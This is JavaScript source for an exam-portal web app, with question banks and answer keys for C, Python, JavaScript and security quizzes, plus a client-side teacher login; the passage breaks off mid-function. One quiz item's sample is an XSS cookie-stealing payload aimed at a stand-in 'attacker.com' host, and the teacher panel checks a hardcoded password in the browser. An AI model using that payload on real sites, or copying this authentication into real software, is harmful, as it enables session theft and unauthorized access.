/**
 * SkillSphere – Examination Portal & Teacher Console Engine
 * Student Desk • Timed Exam Engine • Password-Protected Teacher Console ('teacher')
 * Integrated with Cloud Firestore & Analytics
 */

// =============================================================================
// 1. QUESTION DATABASE
// =============================================================================
const QUESTION_DATABASE = {
  "c-prog": [
    {
      id: "c1",
      question: "Which of the following functions in C allocates memory that is guaranteed to be initialized to zero?",
      options: ["malloc()", "calloc()", "realloc()", "alloca()"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "calloc(n, size) allocates memory for an array of n elements of size bytes and automatically initializes all bytes in the allocated storage to zero. In contrast, malloc() leaves the memory uninitialized (containing garbage values).",
      code: "void *calloc(size_t num, size_t size);"
    },
    {
      id: "c2",
      question: "What is the output of the following C pointer arithmetic snippet on a standard 64-bit architecture?",
      options: ["2000", "2004", "2008", "Undefined Behavior"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "In C, adding 1 to a pointer increments its memory address by sizeof(*ptr). For an int pointer on a 32/64-bit machine where sizeof(int) is 4 bytes, ptr + 1 advances the address from 2000 to 2004.",
      code: "int *ptr = (int *)2000;\nptr = ptr + 1;\nprintf(\"%u\", ptr);"
    },
    {
      id: "c3",
      question: "What occurs if you call free() twice on the same dynamically allocated pointer without reallocating it?",
      options: [
        "Memory is freed twice and becomes available to the OS twice",
        "It is safely ignored by standard glibc",
        "It causes undefined behavior, often a segmentation fault or double-free vulnerability",
        "The pointer automatically becomes NULL"
      ],
      correct: 2,
      marks: 2,
      negative: 0.5,
      explanation: "Calling free() twice on the same pointer is a 'Double Free' flaw that invokes Undefined Behavior. It corrupts internal heap management data structures and represents a critical security vulnerability (CWE-415).",
      code: "int *p = malloc(sizeof(int));\nfree(p);\nfree(p); // Flaw: Double Free"
    },
    {
      id: "c4",
      question: "What is the primary purpose of the 'volatile' qualifier in C?",
      options: [
        "To make variable access thread-safe with atomic locking",
        "To prevent the compiler from optimizing variable reads/writes by forcing reload from memory",
        "To place the variable in CPU registers for faster performance",
        "To allocate the variable on the heap instead of the stack"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "The volatile keyword informs the compiler that a variable's value can change unexpectedly (e.g. by hardware peripherals or interrupt service routines), preventing the compiler from caching it in registers.",
      code: "volatile int sensor_status_register;"
    },
    {
      id: "c5",
      question: "What is the size of the following union on a 64-bit compiler with 4-byte alignment?",
      options: ["10 bytes", "12 bytes", "18 bytes", "4 bytes"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "A union allocates memory equal to its largest member, padded to the alignment requirement of its members. Here arr is 10 bytes and an int is 4 bytes. 10 is rounded up to the nearest multiple of 4, giving 12 bytes.",
      code: "union Data {\n  char arr[10];\n  int value;\n};"
    },
    {
      id: "c6",
      question: "Which preprocessor directive is used to prevent duplicate inclusion of header files?",
      options: ["#pragma once or #ifndef/#define include guards", "#define STRICT", "#import <stdio.h>", "#include_once"],
      correct: 0,
      marks: 2,
      negative: 0.5,
      explanation: "Include guards using #ifndef HEADER_H / #define HEADER_H / #endif (or the compiler extension #pragma once) protect C header files from recursive or duplicate inclusion.",
      code: "#ifndef MY_HEADER_H\n#define MY_HEADER_H\n// declarations\n#endif"
    },
    {
      id: "c7",
      question: "What will sizeof('a') evaluate to in standard C vs C++?",
      options: [
        "In C it is 1, in C++ it is 4",
        "In C it is sizeof(int) (usually 4), in C++ it is sizeof(char) (1)",
        "Both evaluate to 1",
        "Both evaluate to 4"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "In C, character literals like 'a' have type int, so sizeof('a') == sizeof(int) (typically 4). In C++, character literals have type char, so sizeof('a') == 1.",
      code: "printf(\"%zu\", sizeof('a'));"
    },
    {
      id: "c8",
      question: "What is the return value of printf() if formatting fails due to an output error?",
      options: ["0", "A negative number", "NULL", "1"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "printf() returns the total number of characters successfully written, or a negative value if an output or encoding error occurs.",
      code: "int status = printf(\"SkillSphere\\n\");"
    },
    {
      id: "c9",
      question: "What does the 'static' keyword do when applied to a global function in a C file?",
      options: [
        "Makes the function unchangeable (constant)",
        "Limits the function's scope and linkage strictly to that translation unit (file)",
        "Caches the return value of the function",
        "Ensures the function executes on the thread pool"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "Applying static to a function gives it internal linkage, making it invisible and inaccessible to linker symbols outside that specific source (.c) file.",
      code: "static int internal_helper(void) {\n  return 42;\n}"
    },
    {
      id: "c10",
      question: "Which header file must be included to use the fixed-width integer types such as uint32_t and int64_t?",
      options: ["<stdlib.h>", "<stdint.h>", "<limits.h>", "<types.h>"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "<stdint.h> (introduced in C99) defines exact-width integer types like int8_t, int16_t, int32_t, int64_t, and their unsigned counterparts.",
      code: "#include <stdint.h>\nuint32_t packet_id = 100;"
    }
  ],

  "python-prog": [
    {
      id: "py1",
      question: "What is the time complexity of searching for a key in a standard Python dictionary (dict) on average?",
      options: ["O(n)", "O(log n)", "O(1)", "O(n log n)"],
      correct: 2,
      marks: 2,
      negative: 0.5,
      explanation: "Python dictionaries are implemented as highly optimized hash tables. Key lookups, insertions, and deletions have an average-case time complexity of O(1).",
      code: "user_lookup = {'alex': 101, 'sarah': 102}\nprint('alex' in user_lookup)"
    },
    {
      id: "py2",
      question: "What is the output of the following Python snippet with mutable default arguments?",
      options: ["[1], [2]", "[1], [1, 2]", "[1], [2, 1]", "TypeError"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "In Python, default parameter values are evaluated once when the function definition is executed, NOT each time the function is called. The list is shared across calls.",
      code: "def append_to(item, target=[]):\n    target.append(item)\n    return target\n\nprint(append_to(1))\nprint(append_to(2))"
    },
    {
      id: "py3",
      question: "Which of the following built-in data types in Python is MUTABLE?",
      options: ["tuple", "frozenset", "bytearray", "str"],
      correct: 2,
      marks: 2,
      negative: 0.5,
      explanation: "A bytearray is a mutable sequence of integers in the range 0 <= x < 256. Strings, tuples, and frozensets are all immutable.",
      code: "b = bytearray(b'skill')\nb[0] = ord('S')\nprint(b) # bytearray(b'Skill')"
    },
    {
      id: "py4",
      question: "What does the 'yield' keyword turn a Python function into?",
      options: ["An asynchronous coroutine", "A generator function returning a generator iterator", "A lambda expression", "A static class method"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "A function containing the 'yield' statement is a generator function. When called, it returns a generator object that produces items lazily upon each call to next().",
      code: "def count_up():\n    yield 1\n    yield 2"
    },
    {
      id: "py5",
      question: "What does the expression [x * 2 for x in range(5) if x % 2 == 0] produce?",
      options: ["[0, 2, 4]", "[0, 4, 8]", "[2, 6, 10]", "[0, 2, 4, 6, 8]"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "range(5) produces 0, 1, 2, 3, 4. The condition x % 2 == 0 filters it down to 0, 2, 4. Multiplying each by 2 yields [0, 4, 8].",
      code: "[x * 2 for x in range(5) if x % 2 == 0]"
    },
    {
      id: "py6",
      question: "What is the purpose of the '__slots__' attribute in a Python class?",
      options: [
        "To allow private variables that cannot be read from outside",
        "To optimize memory and prohibit the creation of dynamic __dict__ per instance",
        "To declare multi-threaded mutex slots",
        "To define database schema mappings"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "By defining __slots__, Python uses a compact array-based representation for attributes instead of dynamic instance dictionaries (__dict__), drastically saving memory.",
      code: "class Coordinate:\n    __slots__ = ('x', 'y')\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y"
    },
    {
      id: "py7",
      question: "What will print from: print(True + True * 3)?",
      options: ["4", "6", "True", "TypeError"],
      correct: 0,
      marks: 2,
      negative: 0.5,
      explanation: "In Python, bool is a subclass of int where True == 1 and False == 0. Following operator precedence (multiplication before addition): 1 + (1 * 3) = 4.",
      code: "print(True + True * 3)"
    },
    {
      id: "py8",
      question: "Which module in Python's standard library provides deep and shallow copy operations?",
      options: ["sys", "copy", "clone", "pickle"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "The copy module provides copy.copy() for shallow copying and copy.deepcopy() for recursively cloning compound objects.",
      code: "import copy\nnew_list = copy.deepcopy(nested_list)"
    },
    {
      id: "py9",
      question: "What does the GIL (Global Interpreter Lock) in CPython primarily enforce?",
      options: [
        "Prevents programs from accessing unallocated RAM",
        "Ensures that only one native OS thread executes Python bytecode at any given moment",
        "Encrypts bytecode during runtime",
        "Prevents circular import cycles"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "The GIL is a mutex used by CPython to prevent multiple threads from executing Python bytecodes concurrently, safeguarding CPython's reference-counting memory management.",
      code: "import threading"
    },
    {
      id: "py10",
      question: "What is the return value of dict.get('missing_key', 42)?",
      options: ["KeyError exception", "None", "42", "False"],
      correct: 2,
      marks: 2,
      negative: 0.5,
      explanation: "The .get(key, default) method returns the specified default value (here 42) if the key is not found in the dictionary, avoiding a KeyError.",
      code: "data = {}\nval = data.get('port', 42)"
    }
  ],

  "js-core": [
    {
      id: "js1",
      question: "What is the output of console.log(typeof NaN) in JavaScript?",
      options: ["'nan'", "'undefined'", "'number'", "'object'"],
      correct: 2,
      marks: 2,
      negative: 0.5,
      explanation: "In JavaScript (IEEE 754 specification), NaN stands for 'Not-a-Number', but its formal type under the language specification is 'number'.",
      code: "console.log(typeof NaN); // 'number'"
    },
    {
      id: "js2",
      question: "In what order are the console logs printed in this JavaScript event loop example?",
      options: ["A, B, C", "A, C, B", "C, B, A", "B, A, C"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "'A' logs synchronously. The Promise resolution is queued in the Microtask Queue, while setTimeout is queued in the Macrotask Queue. Microtasks run before macrotasks, so output is A, C, B.",
      code: "console.log('A');\nsetTimeout(() => console.log('B'), 0);\nPromise.resolve().then(() => console.log('C'));"
    },
    {
      id: "js3",
      question: "What is the behavior of Promise.all([p1, p2, p3]) if one of the promises rejects?",
      options: [
        "It waits for all others to resolve, then returns errors array",
        "It immediately rejects with the reason of the first promise that rejects ('fail-fast')",
        "It ignores the rejected promise and returns results of resolved ones",
        "It throws a UnhandledRejection fatal runtime exception"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "Promise.all is fail-fast: if any promise in the iterable rejects, the returned promise immediately rejects with that rejection reason.",
      code: "Promise.all([fetch1, fetch2]).catch(err => ...);"
    },
    {
      id: "js4",
      question: "What does the 'Temporal Dead Zone' (TDZ) refer to in ES6 JavaScript?",
      options: [
        "The period when garbage collection freezes main-thread execution",
        "The state between entering a block scope and the variable's declaration where accessing let/const throws ReferenceError",
        "The delay between requestAnimationFrame callbacks",
        "The expiration duration of browser session storage"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "Variables declared with let or const are hoisted to the top of their block but remain uninitialized. Accessing them before their declaration throws a ReferenceError.",
      code: "{\n  // TDZ for myVar begins\n  console.log(myVar); // ReferenceError!\n  let myVar = 10;\n}"
    },
    {
      id: "js5",
      question: "What will 0.1 + 0.2 === 0.3 evaluate to in JavaScript?",
      options: ["true", "false", "TypeError", "undefined"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "Due to IEEE 754 binary floating-point representation, 0.1 + 0.2 calculates to approximately 0.30000000000000004, which does not strictly equal 0.3.",
      code: "console.log(0.1 + 0.2 === 0.3); // false"
    },
    {
      id: "js6",
      question: "Which Array method returns a shallow copy of a portion of an array WITHOUT modifying the original array?",
      options: ["splice()", "slice()", "push()", "sort()"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "slice() returns a new array containing selected elements and does not mutate the source array. splice() mutates the array in-place.",
      code: "const original = [1, 2, 3, 4];\nconst sub = original.slice(1, 3); // [2, 3]"
    },
    {
      id: "js7",
      question: "What is a Closure in JavaScript?",
      options: [
        "A syntax error caused by unclosed curly braces",
        "A function bundled together with references to its surrounding lexical environment",
        "A private class constructor in TypeScript",
        "An API call termination hook"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "A closure is the combination of a function bundled together with references to its surrounding state (lexical environment), allowing an inner function to access an outer function's scope.",
      code: "function outer() {\n  let count = 0;\n  return () => ++count;\n}"
    },
    {
      id: "js8",
      question: "What is the difference between '==' and '===' in JavaScript?",
      options: [
        "'==' checks type only, '===' checks value only",
        "'==' performs type coercion before comparison; '===' checks strict equality without coercion",
        "There is no difference in modern V8 engines",
        "'===' is only allowed inside switch statements"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "The abstract equality operator ('==') converts operands to the same type before comparing. Strict equality ('===') compares both value and type without coercion.",
      code: "'5' == 5;  // true\n'5' === 5; // false"
    },
    {
      id: "js9",
      question: "What does Object.freeze() do to a JavaScript object?",
      options: [
        "Prevents adding or deleting properties, but allows modifying existing property values",
        "Prevents adding, deleting, or modifying existing property values and prototypes",
        "Encodes the object as a read-only JSON string",
        "Compresses the object in V8 memory"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "Object.freeze() makes an object shallowly immutable: new properties cannot be added, existing properties cannot be removed, and values cannot be changed.",
      code: "const config = Object.freeze({ port: 8080 });\nconfig.port = 3000; // Fails"
    },
    {
      id: "js10",
      question: "Which of the following creates a new object with the specified prototype object and properties?",
      options: ["Object.assign()", "Object.create()", "Object.keys()", "Object.prototype()"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "Object.create(proto) creates a new empty object using the existing object passed as proto as the prototype of the newly created object.",
      code: "const child = Object.create(parentPrototype);"
    }
  ],

  "cybersec": [
    {
      id: "sec1",
      question: "What type of attack occurs when an attacker injects malicious client-side script into web pages viewed by other users?",
      options: ["SQL Injection (SQLi)", "Cross-Site Scripting (XSS)", "Server-Side Request Forgery (SSRF)", "Denial of Service (DoS)"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "Cross-Site Scripting (XSS) occurs when malicious JavaScript is executed within a victim's browser session due to lack of input sanitization or output encoding.",
      code: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
    },
    {
      id: "sec2",
      question: "Which cryptographic algorithm is an ASYMMETRIC (public-key) cipher?",
      options: ["AES-256", "RSA", "ChaCha20", "DES"],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "RSA uses a public/private key pair for encryption and signatures (asymmetric). AES, ChaCha20, and DES are all symmetric ciphers sharing one single key.",
      code: "Public Key (Encrypt) -> Private Key (Decrypt)"
    },
    {
      id: "sec3",
      question: "What is the primary security defense against SQL Injection vulnerabilities?",
      options: [
        "Storing passwords in plaintext to avoid hash collisions",
        "Using Parameterized Queries (Prepared Statements) with bound variables",
        "Validating user input using CSS selectors",
        "Disabling HTTPS encryption"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "Prepared Statements (Parameterized Queries) ensure that SQL commands and user inputs are strictly separated by the database driver, treating input as literal parameters rather than executable SQL syntax.",
      code: "SELECT * FROM users WHERE email = ? AND status = ?;"
    },
    {
      id: "sec4",
      question: "What are the three pillars of the security 'CIA Triad'?",
      options: [
        "Control, Identity, Authentication",
        "Confidentiality, Integrity, Availability",
        "Cryptography, Isolation, Authorization",
        "Cloud, Infrastructure, Access"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "The CIA Triad stands for Confidentiality (privacy of information), Integrity (accuracy and tamper-resistance), and Availability (accessibility when required).",
      code: "Confidentiality | Integrity | Availability"
    },
    {
      id: "sec5",
      question: "Why should cryptographic password hashes always use a unique random 'Salt'?",
      options: [
        "To speed up hash computation during high server load",
        "To defend against precomputed Rainbow Table and dictionary attacks across identical passwords",
        "To shorten the final hash output length",
        "To allow password recovery without user confirmation"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "A salt is cryptographically random data added to a password before hashing. It prevents attackers from using precomputed rainbow tables and guarantees identical passwords yield completely different hashes.",
      code: "hash = bcrypt.hash(password, salt=random_bytes(16))"
    },
    {
      id: "sec6",
      question: "What does the 'SameSite' attribute on HTTP cookies defend against when set to 'Strict' or 'Lax'?",
      options: ["Cross-Site Request Forgery (CSRF)", "Man-in-the-Middle (MitM)", "Buffer Overflow", "SQL Injection"],
      correct: 0,
      marks: 2,
      negative: 0.5,
      explanation: "The SameSite cookie attribute controls whether cookies are sent with cross-site requests, providing robust protection against CSRF attacks.",
      code: "Set-Cookie: session_id=xyz; Secure; HttpOnly; SameSite=Strict"
    },
    {
      id: "sec7",
      question: "What does the 'HttpOnly' flag on a cookie prevent?",
      options: [
        "Transmission over unencrypted HTTP",
        "Access to the cookie from client-side JavaScript via document.cookie",
        "Storing the cookie on the browser hard drive",
        "Sending cookies on GET requests"
      ],
      correct: 1,
      marks: 2,
      negative: 0.5,
      explanation: "Setting HttpOnly prevents client-side scripts (such as XSS attacks) from reading or stealing sensitive session tokens via document.cookie.",
      code: "Set-Cookie: auth=token; HttpOnly"
    },
    {
      id: "sec8",
      question: "What port does standard secure HTTPS traffic listen on by default?",
      options: ["80", "8080", "443", "22"],
      correct: 2,
      marks: 2,
      negative: 0.5,
      explanation: "Standard HTTPS listens on TCP port 443 (HTTP uses port 80, SSH uses port 22).",
      code: "https://skillsphere.dev:443"
    },
    {
      id: "sec9",
      question: "Which of the following is considered a modern, adaptive, and slow key-stretching password hashing function?",
      options: ["MD5", "SHA-1", "bcrypt / Argon2id", "CRC32"],
      correct: 2,
      marks: 2,
      negative: 0.5,
      explanation: "Argon2id and bcrypt are designed to be computationally and memory-expensive, making brute-force and GPU hardware attacks economically unfeasible.",
      code: "argon2id(password, salt, memory_cost, time_cost)"
    },
    {
      id: "sec10",
      question: "In public-key cryptography, how does a user verify a Digital Signature created by the sender?",
      options: [
        "Decrypts the signature using the sender's Public Key and compares the computed hash",
        "Decrypts the signature using their own Private Key",
        "Sends a verification handshake to a DNS server",
        "Checks if the message length is divisible by 64"
      ],
      correct: 0,
      marks: 2,
      negative: 0.5,
      explanation: "The sender hashes the message and encrypts the hash with their Private Key (signing). The recipient verifies by decrypting the signature using the sender's widely published Public Key and matching the hash.",
      code: "Verify: DecryptWithPublicKey(signature) == Hash(message)"
    }
  ]
};

// Default Catalog Assessments
const DEFAULT_QUIZZES = [
  {
    id: "c-prog",
    title: "C Systems Programming & Memory Engineering",
    subject: "C Programming",
    category: "Programming",
    difficulty: "Intermediate",
    durationMinutes: 15,
    totalMarks: 20,
    passingPercentage: 60,
    negativeMarkingEnabled: true,
    negativeMarks: 0.5,
    description: "Assess your mastery over pointer arithmetic, dynamic memory heaps, struct alignment, and translation unit linkage.",
    questionCount: 10
  },
  {
    id: "python-prog",
    title: "Python 3 Engineering: Internals & Performance",
    subject: "Python Programming",
    category: "Programming",
    difficulty: "Intermediate",
    durationMinutes: 15,
    totalMarks: 20,
    passingPercentage: 60,
    negativeMarkingEnabled: true,
    negativeMarks: 0.5,
    description: "Deep dive into GIL behavior, generator pipelines, __slots__ optimizations, and hash table complexity.",
    questionCount: 10
  },
  {
    id: "js-core",
    title: "Modern JavaScript Core: Event Loop & Closures",
    subject: "JavaScript",
    category: "Web Dev",
    difficulty: "Advanced",
    durationMinutes: 15,
    totalMarks: 20,
    passingPercentage: 60,
    negativeMarkingEnabled: true,
    negativeMarks: 0.5,
    description: "Rigorous evaluation of microtask queue sequencing, lexical closures, Promise semantics, and prototyping.",
    questionCount: 10
  },
  {
    id: "cybersec",
    title: "Cybersecurity Defense: Protocols & Cryptography",
    subject: "Cybersecurity",
    category: "Systems & Security",
    difficulty: "Intermediate",
    durationMinutes: 15,
    totalMarks: 20,
    passingPercentage: 60,
    negativeMarkingEnabled: true,
    negativeMarks: 0.5,
    description: "Hands-on theoretical assessment of XSS defenses, SameSite tokens, public-key signatures, and salting strategies.",
    questionCount: 10
  }
];

// Mock Student Attempts
const DEFAULT_ATTEMPTS = [
  {
    id: "att_1",
    quizId: "c-prog",
    quizTitle: "C Systems Programming & Memory Engineering",
    subject: "C Programming",
    obtainedMarks: 18.0,
    totalMarks: 20.0,
    percentage: 90.0,
    correctCount: 9,
    incorrectCount: 1,
    unansweredCount: 0,
    timeTakenSeconds: 412,
    isPassed: true,
    date: "2026-11-20"
  },
  {
    id: "att_2",
    quizId: "python-prog",
    quizTitle: "Python 3 Engineering: Internals & Performance",
    subject: "Python Programming",
    obtainedMarks: 19.0,
    totalMarks: 20.0,
    percentage: 95.0,
    correctCount: 10,
    incorrectCount: 0,
    unansweredCount: 0,
    timeTakenSeconds: 380,
    isPassed: true,
    date: "2026-11-21"
  },
  {
    id: "att_3",
    quizId: "cybersec",
    quizTitle: "Cybersecurity Defense: Protocols & Cryptography",
    subject: "Cybersecurity",
    obtainedMarks: 15.0,
    totalMarks: 20.0,
    percentage: 75.0,
    correctCount: 8,
    incorrectCount: 2,
    unansweredCount: 0,
    timeTakenSeconds: 460,
    isPassed: true,
    date: "2026-11-23"
  }
];

// Mock Instructor Roster
const DEFAULT_ROSTER = [
  { name: "Alex Rivera", studentId: "CS-2024-0418", quizTitle: "C Systems Programming", score: "18.0 / 20", pct: 90.0, time: "06:52", date: "Nov 20, 2026", passed: true },
  { name: "Sarah Chen", studentId: "CS-2024-0102", quizTitle: "Python Engineering", score: "20.0 / 20", pct: 100.0, time: "05:14", date: "Nov 21, 2026", passed: true },
  { name: "Devon Vance", studentId: "CS-2024-0891", quizTitle: "Cybersecurity Defense", score: "10.5 / 20", pct: 52.5, time: "11:20", date: "Nov 22, 2026", passed: false },
  { name: "Maria Garcia", studentId: "CS-2024-0331", quizTitle: "Modern JavaScript Core", score: "16.0 / 20", pct: 80.0, time: "08:33", date: "Nov 23, 2026", passed: true }
];

// =============================================================================
// 2. APPLICATION STATE
// =============================================================================
let appState = {
  activeView: 'student',
  isTeacherAuthenticated: false,
  quizzes: [],
  attempts: [],
  roster: [],
  scoreChartInstance: null,

  currentExam: {
    quiz: null,
    questions: [],
    currentIndex: 0,
    answers: {},
    markedReview: {},
    remainingSeconds: 0,
    totalSeconds: 0,
    timerIntervalId: null,
    startedAt: null
  },

  lastResult: null
};

// Bootstrap
document.addEventListener('DOMContentLoaded', () => {
  initStorage();
  initStudentProfile();
  initLucideIcons();
  renderCatalogGrid();
  renderStudentDashboard();
  renderInstructorView();
  checkAndRestoreActiveExam();
});

function initStorage() {
  const savedQuizzes = localStorage.getItem('skillsphere_quizzes');
  appState.quizzes = savedQuizzes ? JSON.parse(savedQuizzes) : DEFAULT_QUIZZES;

  const savedAttempts = localStorage.getItem('skillsphere_attempts');
  appState.attempts = savedAttempts ? JSON.parse(savedAttempts) : DEFAULT_ATTEMPTS;

  const savedRoster = localStorage.getItem('skillsphere_roster');
  appState.roster = savedRoster ? JSON.parse(savedRoster) : DEFAULT_ROSTER;

  // Restore any teacher-added questions stored locally
  const savedCustomQuestions = localStorage.getItem('skillsphere_custom_questions');
  if (savedCustomQuestions) {
    try {
      const parsed = JSON.parse(savedCustomQuestions);
      Object.keys(parsed).forEach(quizId => {
        QUESTION_DATABASE[quizId] = parsed[quizId];
      });
    } catch (e) {
      console.warn("Could not restore custom questions", e);
    }
  }
}

function initStudentProfile() {
  const savedName = localStorage.getItem('skillsphere_student_name') || 'Alex Rivera';
  const nameEl = document.getElementById('student-name-display');
  if (nameEl) nameEl.innerText = savedName;
}

function promptEditStudentName() {
  const current = localStorage.getItem('skillsphere_student_name') || 'Alex Rivera';
  const newName = prompt("Enter Candidate Full Name:", current);
  if (newName && newName.trim()) {
    localStorage.setItem('skillsphere_student_name', newName.trim());
    initStudentProfile();
    showToast(`Candidate updated to: ${newName.trim()}`, 'success');
  }
}

function initLucideIcons() {
  if (window.lucide) {
    window.lucide.createIcons();
  }
}

// =============================================================================
// 3. TEACHER PANEL AUTHENTICATION ('teacher' is default pass)
// =============================================================================
function handleTeacherPanelClick() {
  if (appState.activeView === 'teacher') {
    // If currently on teacher view, switch back to student desk
    navigateTo('student');
    return;
  }

  if (appState.isTeacherAuthenticated) {
    navigateTo('teacher');
  } else {
    // Open password prompt modal
    document.getElementById('teacher-pwd-input').value = '';
    document.getElementById('teacher-pwd-error').classList.add('hidden');
    openModal('modal-teacher-password');
  }
}

function handleTeacherPasswordSubmit(e) {
  e.preventDefault();
  const input = document.getElementById('teacher-pwd-input').value.trim();
  const errorEl = document.getElementById('teacher-pwd-error');

  // Verify password: default is 'teacher'
  if (input === 'teacher') {
    appState.isTeacherAuthenticated = true;
    closeModal('modal-teacher-password');
    updateTeacherNavState(true);
    navigateTo('teacher');
    showToast("Teacher Panel unlocked successfully.", "success");
  } else {
    errorEl.classList.remove('hidden');
  }
}

function lockTeacherPanel() {
  appState.isTeacherAuthenticated = false;
  updateTeacherNavState(false);
  navigateTo('student');
  showToast("Teacher Panel locked.", "info");
}

function updateTeacherNavState(isUnlocked) {
  const label = document.getElementById('teacher-btn-label');
  const icon = document.getElementById('teacher-btn-icon');
  const studentPill = document.getElementById('nav-student-pill');
  const teacherPill = document.getElementById('nav-teacher-pill');

  if (isUnlocked) {
    if (label) label.innerText = "Exit Teacher View";
    if (studentPill) studentPill.classList.add('hidden');
    if (teacherPill) teacherPill.classList.remove('hidden');
  } else {
    if (label) label.innerText = "Teacher Panel";
    if (studentPill) studentPill.classList.remove('hidden');
    if (teacherPill) teacherPill.classList.add('hidden');
  }
  initLucideIcons();
}

function togglePasswordVisibility(inputId) {
  const el = document.getElementById(inputId);
  if (el) {
    el.type = el.type === 'password' ? 'text' : 'password';
  }
}

// =============================================================================
// 4. ROUTER & VIEW NAVIGATION
// =============================================================================
function navigateTo(viewName) {
  if (appState.activeView === 'exam' && viewName !== 'exam') {
    const confirmLeave = confirm("Warning: An examination is active. Leaving this page will not pause the timer. Proceed?");
    if (!confirmLeave) return;
  }

  appState.activeView = viewName;

  document.querySelectorAll('.view-section').forEach(sec => sec.classList.add('hidden'));

  const target = document.getElementById(`view-${viewName}`);
  if (target) {
    target.classList.remove('hidden');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // Update pills and button labels
  if (viewName === 'teacher') {
    updateTeacherNavState(true);
    renderInstructorView();
  } else {
    updateTeacherNavState(appState.isTeacherAuthenticated);
    if (viewName === 'student') {
      renderStudentDashboard();
      renderCatalogGrid();
    }
  }

  initLucideIcons();
}

function scrollToCatalog() {
  const catalog = document.getElementById('student-quiz-catalog');
  if (catalog) catalog.scrollIntoView({ behavior: 'smooth' });
}

// =============================================================================
// 5. CATALOG & EXAM CARDS
// =============================================================================
function renderCatalogGrid(categoryFilter = 'all') {
  const grid = document.getElementById('quiz-catalog-grid');
  if (!grid) return;

  const filtered = categoryFilter === 'all' 
    ? appState.quizzes 
    : appState.quizzes.filter(q => q.category === categoryFilter);

  grid.innerHTML = filtered.map(quiz => `
    <div class="bg-white rounded-2xl border border-slate-200/90 p-5 flex flex-col justify-between shadow-2xs hover:shadow-lg hover:border-royal-200 transition-all">
      <div>
        <div class="flex items-center justify-between mb-2.5">
          <span class="text-[10.5px] font-bold uppercase tracking-wider px-2.5 py-0.5 rounded-full bg-royal-50 text-royal-700 border border-royal-100">
            ${quiz.subject}
          </span>
          <span class="text-xs font-semibold text-slate-500 flex items-center gap-1">
            <i data-lucide="bar-chart" class="w-3.5 h-3.5 text-slate-400"></i> ${quiz.difficulty}
          </span>
        </div>

        <h3 class="text-base font-extrabold text-navy-950 mb-1.5 leading-snug">
          ${quiz.title}
        </h3>
        <p class="text-xs text-slate-500 mb-4 line-clamp-2 leading-relaxed">
          ${quiz.description}
        </p>

        <div class="grid grid-cols-3 gap-2 py-2.5 border-y border-slate-100 text-[11px] font-medium text-slate-600 mb-3.5">
          <div>
            <span class="text-slate-400 block text-[10px] uppercase font-bold">Questions</span>
            <strong class="text-navy-950">${quiz.questionCount || 10} MCQs</strong>
          </div>
          <div>
            <span class="text-slate-400 block text-[10px] uppercase font-bold">Duration</span>
            <strong class="text-navy-950">${quiz.durationMinutes} Mins</strong>
          </div>
          <div>
            <span class="text-slate-400 block text-[10px] uppercase font-bold">Marks</span>
            <strong class="text-navy-950">${quiz.totalMarks} Total</strong>
          </div>
        </div>
      </div>

      <div class="flex items-center justify-between pt-1">
        <span class="text-xs font-semibold ${quiz.negativeMarkingEnabled ? 'text-amber-600' : 'text-slate-400'}">
          ${quiz.negativeMarkingEnabled ? `-${quiz.negativeMarks} per wrong` : 'No negative marks'}
        </span>
        <button onclick="openInstructionsModal('${quiz.id}')" class="btn-primary text-xs font-semibold px-4 py-2 rounded-xl flex items-center gap-1.5 shadow-sm">
          <span>Start Exam</span>
          <i data-lucide="chevron-right" class="w-3.5 h-3.5"></i>
        </button>
      </div>
    </div>
  `).join('');

  initLucideIcons();
}

function filterCatalog(category, buttonEl) {
  document.querySelectorAll('#catalog-category-filters .filter-pill').forEach(btn => btn.classList.remove('active'));
  if (buttonEl) buttonEl.classList.add('active');
  renderCatalogGrid(category);
}

// =============================================================================
// 6. INSTRUCTIONS & LIVE EXAM ENGINE
// =============================================================================
let pendingQuizToStart = null;

function openInstructionsModal(quizId) {
  const quiz = appState.quizzes.find(q => q.id === quizId) || appState.quizzes[0];
  pendingQuizToStart = quiz;

  document.getElementById('modal-inst-title').innerText = quiz.title;
  document.getElementById('modal-inst-subtitle').innerText = `${quiz.subject} • ${quiz.difficulty} Level`;
  document.getElementById('modal-inst-qcount').innerText = `${quiz.questionCount || 10} MCQs`;
  document.getElementById('modal-inst-duration').innerText = `${quiz.durationMinutes} Minutes`;
  document.getElementById('modal-inst-passing').innerText = `${quiz.passingPercentage}%`;
  document.getElementById('modal-inst-negative').innerText = quiz.negativeMarkingEnabled 
    ? `-${quiz.negativeMarks} marks/incorrect` 
    : 'Disabled';

  openModal('modal-instructions');
}

function confirmAndLaunchExam() {
  closeModal('modal-instructions');
